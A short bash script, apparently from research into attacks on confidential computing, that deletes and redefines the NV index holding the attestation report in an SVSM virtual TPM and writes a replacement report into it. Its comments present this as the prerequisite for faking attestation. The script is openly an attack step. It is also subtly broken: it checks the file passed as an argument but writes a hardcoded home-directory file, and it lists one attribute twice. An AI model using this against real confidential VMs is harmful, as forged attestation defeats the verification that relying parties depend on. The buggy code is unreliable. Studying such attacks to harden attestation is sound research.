#!/bin/bash

# This simple function overwrites the attestation report in an SVSM vTPM.
# This is a pre-requisite of any attack that involves faking an attestation report.

if [[ $# != 1 ]]
then
    echo "Usage: $0 <attestation_report_file>"
    exit 1
fi

new_attestation_report=$1
filelen=$(wc -c ${new_attestation_report} | awk '{ print $1 }')

if [[ ${filelen} != 1184 ]]
then
    echo "${new_attestation_report} is not a valid attestation report"
    exit 1
fi

sudo tpm2_nvundefine -C p 0x1c00002
sudo tpm2_nvdefine -Q 0x1c00002 -C o -s 1184 -a "ownerread|ownerwrite|policywrite|read_stclear|policyread|ppread|ownerread|authread|no_da"
sudo tpm2_nvwrite -Q 0x1c00002 -C o -i ~galmasi/guest_report.bin
